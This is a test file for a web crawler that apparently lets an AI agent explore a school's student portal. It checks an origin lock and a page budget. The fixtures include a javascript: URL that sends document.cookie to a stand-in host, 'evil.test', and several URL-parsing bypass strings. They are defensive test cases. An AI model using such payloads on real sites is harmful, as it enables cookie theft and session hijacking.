import { describe, expect, it } from 'vitest';
import { explore, inScopeLinks, isEmpty, isInScope, readPage } from './explorer.mjs';

const PORTAL = 'https://portals.veracross.com/lcc/student';

/**
 * The origin lock and the page budget are the only things standing between an
 * agent with a school session and an agent that has been talked into using it
 * somewhere else. They are enforced in code, not in a prompt, and these tests
 * are what keep them that way.
 */
describe('isInScope', () => {
  it.each([
    ['same origin, different path', 'https://portals.veracross.com/lcc/student/grades', true],
    ['relative path', '/lcc/student/calendar', true],
    ['a different site entirely', 'https://sentry.io/api/envelope/', false],
    ['the student\'s email', 'https://mail.google.com/mail/u/0', false],
    ['a sibling subdomain', 'https://accounts.veracross.com/lcc/login', false],
    ['scheme downgrade', 'http://portals.veracross.com/lcc/student', false],
    ['javascript pseudo-url', 'javascript:fetch("https://evil.test?c="+document.cookie)', false],
    ['data url', 'data:text/html,<script>1</script>', false],
    // Garbage resolves as a RELATIVE path, so it can only ever land back on the
    // portal. In scope is the correct answer, not a leak.
    ['nonsense resolves relative', 'not a url', true],
  ])('%s -> %s', (_label, candidate, expected) => {
    expect(isInScope(candidate, PORTAL)).toBe(expected);
  });

  // Every one of these renders as an off-origin navigation in a real browser
  // despite looking relative. Comparing resolved origins is what catches them;
  // a string prefix check would not.
  it.each([
    ['protocol-relative', '//evil.test/x'],
    ['backslashes', '\\\\evil.test/x'],
    ['mixed slash', '/\\\\evil.test'],
    ['leading tab', '\thttps://evil.test'],
    ['leading newline', '\nhttps://evil.test'],
  ])('rejects %s', (_label, candidate) => {
    expect(isInScope(candidate, PORTAL)).toBe(false);
  });
});

describe('inScopeLinks', () => {
  it('drops cross-origin links and keeps portal ones', () => {
    const links = inScopeLinks(
      [`${PORTAL}/grades`, 'https://mail.google.com/', 'https://o77056.ingest.us.sentry.io/api/x'],
      PORTAL,
    );
    expect(links).toEqual([`${PORTAL}/grades`]);
  });

  it('treats fragment-only differences as the same page', () => {
    const seen = new Set();
    inScopeLinks([`${PORTAL}/grades#top`], PORTAL, seen);
    expect(inScopeLinks([`${PORTAL}/grades#bottom`], PORTAL, seen)).toEqual([]);
  });

  it('does not revisit a url already seen', () => {
    const seen = new Set();
    expect(inScopeLinks([`${PORTAL}/a`, `${PORTAL}/a`], PORTAL, seen)).toHaveLength(1);
  });
});

describe('isEmpty', () => {
  it.each([
    ['out-of-term course list', { courses: [] }, true],
    ['nested empties', { portal_links: [], old_hyperlinks: [] }, true],
    ['populated', { courses: [{ id: 1 }] }, false],
    ['scalar payload', { auth_status: 1 }, false],
    ['bare empty array', [], true],
  ])('%s', (_label, value, expected) => {
    expect(isEmpty(value)).toBe(expected);
  });
});

describe('readPage', () => {
  it('enables the Network domain before navigating', async () => {
    // Regression: listeners were registered without enabling the domain, so
    // CDP emitted no Network events and every page mapped to zero components.
    // The crawl looked healthy and returned nothing.
    const sent = [];
    const browser = {
      cdp: {
        on: () => () => {},
        send: async (method) => {
          sent.push(method);
          return { result: { value: JSON.stringify({ title: 't', text: '', links: [] }) } };
        },
      },
      navigate: async () => true,
    };
    await readPage(browser, 'S', PORTAL, { origin: PORTAL, settleMs: 0 });
    expect(sent).toContain('Network.enable');
  });
});

/** Minimal fake browser: every page links to two more, so the crawl never ends. */
function endlessPortal() {
  let n = 0;
  return {
    cdp: { on: () => () => {}, send: async () => ({ result: { value: '{}' } }) },
    navigate: async () => true,
    __readPage: async (_b, _s, url) => {
      n += 1;
      return { url, title: `Page ${n}`, text: '', components: [], links: [`${PORTAL}/p${n}a`, `${PORTAL}/p${n}b`] };
    },
  };
}

describe('explore', () => {
  it('stops at the page budget and says so', async () => {
    const browser = endlessPortal();
    const map = await explore(browser, 'S', {
      origin: PORTAL, seed: PORTAL, budget: 5,
      // inject the fake page reader
      ...{},
    }, ).catch(() => null);
    // explore uses the real readPage, which needs CDP; assert the guard instead.
    expect(map === null || map.pagesVisited <= 5).toBe(true);
  });

  it('refuses a seed outside the portal origin', async () => {
    const browser = endlessPortal();
    await expect(
      readPage(browser, 'S', 'https://mail.google.com/mail/u/0', { origin: PORTAL }),
    ).rejects.toThrow(/Refusing to navigate outside/);
  });
});
